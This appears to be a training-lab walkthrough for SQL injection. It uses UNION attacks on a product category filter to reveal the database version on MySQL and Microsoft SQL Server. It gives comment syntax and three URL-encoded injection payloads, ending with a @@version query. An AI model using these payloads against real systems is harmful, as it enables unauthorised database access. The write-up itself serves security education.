## SQL injection attack, querying the database type and version on MySQL and Microsoft

### Lab description
This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query. 

**Goal:** display the database version string. 

---

## Steps

For the first - need to known how to comment in MySQL and Microsoft.

Microsoft: **--comment** and **/\*comment\*/** 

MySQL: **#comment** , **-- comment** *[Note the space after the double dash]* and **/\*comment\*/**

Let's analyses: 

```SQL
'+UNION+SELECT+NULL,+NULL%23   200 OK
```
*\* %23 - is **#** after URL-encoding*
```SQL
'+UNION+SELECT+'qwe','123'%23   200 OK
```

For determine version need to use SELECT+@@version.

```SQL
'+UNION+SELECT+@@version,+NULL%23   200 OK
```

>**Congratulations, you solved the lab!**